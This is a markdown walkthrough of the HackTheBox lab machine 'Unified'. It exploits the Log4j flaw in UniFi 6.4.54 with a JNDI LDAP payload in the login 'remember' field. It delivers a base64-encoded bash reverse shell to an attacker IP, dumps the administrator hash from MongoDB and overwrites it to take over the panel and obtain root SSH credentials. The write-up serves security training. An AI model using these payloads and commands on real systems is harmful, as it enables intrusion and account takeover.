---
title: Walkthrough - Unified - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - log4j
  - jndi
  - mongodb
---

# Walkthrough - Unified - A HackTheBox machine


Enumerate open services:

```bash
nmap -sC -sV $ip -Pn
```

Results:

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Mon, 08 May 2023 10:46:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Mon, 08 May 2023 10:46:41 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 08 May 2023 10:46:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be8c035e126827d1fe612ddc76a919
| SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
``` 


After visiting https://10.129.96.149:8080/, we are redirected to https://10.129.96.149:8443/manage/account/login

It's a login panel of Unifi application and version is disclosed: 6.4.54. A quick search in google for "exploit unifi 6.4.54" returns that it has a [log4j vulnerability](log4j.md).

For exploiting it:

```bash
sudo apt install openjdk-11-jre maven



git clone https://github.com/veracode-research/rogue-jndi 

cd rogue-jndi

mvn package

# Once it's build, make a reverse shell in base64 with attacker machine and listening port
echo 'bash -c bash -i >&/dev/tcp/10.10.14.2/4444 0>&1' | base64
# This will return: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
 
# Get out of rogue-jndi folder and
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.129.96.149"
# In the bash command, copy paste your reverse shell in base64
# --hostname: Victim IP
```

Now, open a terminal, launch netcat abd the listening port you defined in your payload.

With Burpsuite, get a request for login:

```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.96.149:8443/manage/account/login
Content-Type: application/json; charset=utf-8
Origin: https://10.129.96.149:8443
Content-Length: 104
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"lala","password":"lele","remember":false,"strict":true}
```

As we can read from the Unifi version exploit, the injectable parameter is "remember". So we insert there our payload and with Repeater, send the request:


```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.96.149:8443/manage/account/login
Content-Type: application/json; charset=utf-8
Origin: https://10.129.96.149:8443
Content-Length: 104
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"lala","password":"lele","remember":"${jndi:ldap://10.10.14.2:1389/o=tomcat}","strict":true}
```

Once we send that request, our jndi server will resend the reverse shell:

![jndi server](log4j.md)

And in our terminal with the nc listener we will get the reverse shell. [Spawn it](spawn-a-shell.md) with:

```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

user.txt is under /home/michael/


## Privilege escalation

Do some basic reconnaissance:

```bash
whoami
id
groups
sudo -l
uname -a
```

Also we can see /etc/passwd to see other existing services/users.

``bash
cat /etc/passwd
```

Results:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
unifi:x:999:999::/home/unifi:/bin/sh
mongodb:x:101:102::/var/lib/mongodb:/usr/sbin/nologin
```

After user unifi, we have a mondodb service. Also, we knew that under unifi version 6.4.54, it we could get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. 

[See mongodb cheat sheet](27017-27018-mongodb.md). 

First thing, find out on which port is running the service:

```
ps aux | grep mongo
```

Results: 

```
unifi         67  0.4  4.2 1103744 85568 ?       Sl   11:44   0:46 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       5183  0.0  0.0  11468  1108 pts/0    S+   14:47   0:00 grep mongo
```

Port 27117. Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace.

From the terminal of the victim's machine:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
# mongo: To use mongo interactive command line
# --port: Indicate the port
# ace: default database in mongo
# --eval: evaluate JSON
```

And now we have...


```
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : 
``

The output reveals a user called administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility. The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.

```bash
mkpasswd -m sha-512 lalala 
```

It returns: $6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0

With that, now we can update the administrator password. From the terminal of the victim's machine:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0"}})'
# ObjectId is the one that correlates with the administrator one.
```

Now, in the admin panel from the browser enter the new credentials for administrator.

When logged into the dashboard, grab ssh credentials for root user from Settings>Site, tab "Device Authentication", SSH Authentication.

With those credentials, access via [ssh connection](22-ssh.md).

 
